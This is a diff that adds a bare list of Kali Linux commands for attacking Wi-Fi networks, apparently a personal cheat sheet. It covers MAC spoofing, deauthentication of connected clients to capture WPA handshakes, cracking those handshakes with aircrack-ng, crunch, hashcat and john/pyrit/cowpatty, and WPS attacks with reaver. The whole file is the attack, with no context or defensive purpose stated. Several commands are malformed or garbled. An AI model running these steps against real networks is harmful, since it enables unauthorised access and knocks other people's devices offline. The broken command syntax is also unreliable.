@@ -1,0 +1,27 @@
+kali@linux:~# iwconfig wlan0 txpower 30
+kali@linux:~# airmon-ng start wlan0
+root@kali:~# airmon-ng check kill
+root@kali:~# airodump-ng wlan0mon
+root@kali:~# aireplay-ng -9 wlan0mon
+root@kali:~# airmon-ng
+root@kali:~# ifconfig
+root@kali:~# airmon-ng start wlan0
+root@kali:~# airodump-ng wlan0mon
+root@kali:~# airodump-ng -c 6 wlan0mon
+root@kali:~# ifconfig wlan0 down
+root@kali:~# ifconfig wlan0 | grep HW
+root@kali:~# ifconfig wlan0 hw ether 38:33:15:xx:xx:xx
+root@kali:~# ifconfig wlan0 up  
+root@kali:~# macchanger wlan0 -e  
+root@kali:~# macchanger wlan0 -r 
+airodump-ng -wlan0
+root@kali:~# airodump-ng --bssid<MAC Address> -c 1 --showack-write /root/Desktop/Wifi/nameofthewifi
+root@kali:~# aireplay-ng -deauth 11 -a <MAC Address> wlan0mon
+root@kali:~# aircrack-ng-w passwordlist -b BSSID /root/Desktop/Wifi/nameofthewifi.cap  
+root@kali:~# crunch 05 25abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWX YZ0123456789 | aircrack-ng --bssid (MAC address)  -w /root/Desktop/wifi/nameofthewifi.cap
+root@kali:~# aircrack-ng /root/Desktop/wifi/nameofthewifi.cap -J <output file> 
+root@kali:~# cuda Hashcat-plus32.bin -m 2500 <filename>.hccap <wordlist>  
+# john --stdout --incremental:all | pyrit -e WIFIESSID -i 1 -o - passthrough | cowpatty -r yourhandshake.cap -d - -s WIFIESSID  
+root@kali:~# wash -i wlan0 --ignore-fcs
+root@kali:~# reaver -i wlan0 -b (BBSID) -vv  
+root@kali:~# aireplay-ng -0 0 -a (bssid) -c wlan0
